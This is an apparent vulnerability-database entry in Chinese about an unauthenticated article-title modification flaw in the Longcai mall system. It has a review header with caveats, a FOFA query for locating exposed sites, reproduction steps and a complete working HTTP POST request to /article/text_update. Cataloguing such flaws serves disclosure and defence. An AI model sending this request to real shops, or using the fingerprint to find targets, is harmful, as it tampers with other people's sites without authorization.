---
source: "wy876 漏洞文库"
title: "龙采商城系统 article/text_update未授权内容修改"
product: "龙采商城系统"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知，存在article_id"
prerequisites: "匿名声称"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/lvt3fs0uh5qmnvyc"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E9%BE%99%E9%87%87%E7%A7%91%E6%8A%80%E9%9B%86%E5%9B%A2%E6%9C%89%E9%99%90%E8%B4%A3%E4%BB%BB%E5%85%AC%E5%8F%B8/%E9%BE%99%E9%87%87%E5%95%86%E5%9F%8E%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BF%AE%E6%94%B9%E6%96%87%E7%AB%A0title.md"
fofa: "body=\"'url':'/pc2.0/index/index'\""
fofa_unverified: "body="
id: "vw-4a06d4b14909119a1c55af77"
entity_id: "ve-4a06d4b14909119a1c55af77"
schema_version: "1"
---

# 龙采商城系统 article/text_update未授权内容修改

## 条目说明

- 对象与具体问题：龙采商城系统；article/text_update未授权内容修改
- 版本、配置及部署条件：版本未知，存在article_id
- 认证与权限前提：匿名声称
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 示例直接修改业务标题，建议原文+1再恢复仍有可见篡改风险，应只在自建测试数据进行
- 文称改为常见问题1与建议原名+1不一致，需显著保留状态变更/恢复前提
- parameter是否允许改其他字段不能由title例推断；缺返回状态、权限对照及修复
- 中文body Content-Length须按实际UTF8与编码重算，HTML噪声

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

#### 一、漏洞描述
龙采科技集团有限责任公司龙采商城系统后台未授权修改文章title，可直接无需登录后台后即可修改文章title。

#### 二、影响版本
龙采商城系统

#### 三、资产测绘
FOFA：body="'url':'/pc2.0/index/index'"

#### 四、漏洞复现
来到帮助中心，随机找一个分类标题，F12查看其article_id记录下来，替换掉POC里的id值，请求POC，更改data内容（建议以原来title内容+1作为区分，攻击后记得改回来），刷新页面发现标题已经被更改！

```http
POST /article/text_update HTTP/2
Host: xxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 39

id=77&parameter=title&data=常见问题1
```

> 请求长度说明：原资料 Content-Length 为 39；保留原始标头；其数值未据实际请求体重新计算或验证。


刷新以后发现已将"购物流程"修改为"常见问题1"





> 原文: <https://www.yuque.com/xiaokp7/ocvun2/lvt3fs0uh5qmnvyc>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
